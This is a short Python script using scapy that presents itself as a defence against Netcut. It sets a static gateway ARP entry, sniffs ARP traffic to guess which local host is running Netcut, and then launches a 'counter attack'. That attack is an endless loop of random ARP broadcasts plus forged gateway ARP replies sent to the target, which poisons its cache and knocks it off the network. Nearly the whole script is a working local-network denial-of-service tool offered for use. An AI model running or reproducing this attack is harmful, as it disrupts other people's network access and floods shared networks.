#!/usr/bin/env python


from scapy.all import sniff, Ether, ARP, RandIP, RandMAC, Padding, sendp, conf
import commands, os, sys

#gw_mac = commands.getoutput("arp -i %s | grep %s" % (conf.iface,conf.iface)).split()[2]
gw_ip = commands.getoutput("ip route list | grep default").split()[2]
    
def protect(gw_ip, gw_mac):
    os.popen("arp -s %s %s" % (gw_ip, gw_mac))
    print "Protected himself"
    
def detect():
        ans = sniff(filter='arp', timeout=7)
        target = []
        for r in ans.res:
            target.append(r.sprintf("%ARP.pdst% %ARP.hwsrc% %ARP.psrc%")) 
        return target

def preattack(gw_ip):
    flag = 0
    num = []
    count = 0
    target = 0
    temp = 0
    print "Detecting..."
    d = detect()
    for i in range(len(d)):
        if d[i].split()[0] == "255.255.255.255":
            num.append(d.count(d[i])) 
            if d.count(d[i]) > count:
                count = d.count(d[i])
                target = i
        if d[i].split()[0] == gw_ip:
            temp += 1       
    if len(d) < 7:
        print "[-] No one use Netcut or try again"
        exit()
    if len(num) * 7 < temp:
        num[:] = []
        count = 0
        result = float(temp) / len(d) * 100
        for j in range(len(d)):
            if d[j].split()[0] == gw_ip:
                if d.count(d[j]) > count:
                    count = d.count(d[j])
                    target = j
            result = float(temp) / len(d) * 100
        flag = 1
    else:
        num.reverse()
        result = float(num[0] + temp) / len(d) * 100
    print "There is a possibility that " + str(result) + "%"
    if result >= 50:
        target_mac = d[target].split()[1]
        target_ip = d[target].split()[2]
        print "[+] Detected, Netcut using by IP %s MAC %s" % (target_ip, target_mac)
        if flag == 0:
            attack(target_mac, target_ip, gw_ip)
        else:
            print "[-] Can't Attack"    
    else:
        print "[-] No one use Netcut or try again"

def attack(target_mac, target_ip, gw_ip):
    print "[+] Counter Attack !!!"
    e = Ether(dst="FF:FF:FF:FF:FF:FF")
    while 1:
        a = ARP(psrc=RandIP(), pdst=RandIP(), hwsrc=RandMAC(), hwdst=RandMAC(), op=1)
        p = e / a / Padding("\x00"*18)
        sendp(p, verbose=0)
        a1 = ARP(psrc=gw_ip, pdst=target_ip, hwsrc=RandMAC(), hwdst=target_mac, op=2)
        p1 = e / a1 / Padding("\x00"*18)
        sendp(p1, verbose=0)
        
if __name__ == '__main__':
    os.system("clear")
    if len(sys.argv) == 2 or len(sys.argv) == 3:
        if len(sys.argv) == 2:
            conf.iface = sys.argv[1]
            preattack(gw_ip)
        if len(sys.argv) == 3:
            conf.iface = sys.argv[1]
            gw_mac = sys.argv[2]
            protect(gw_ip, gw_mac)
            preattack(gw_ip)
    else:
        print 'Mode'   

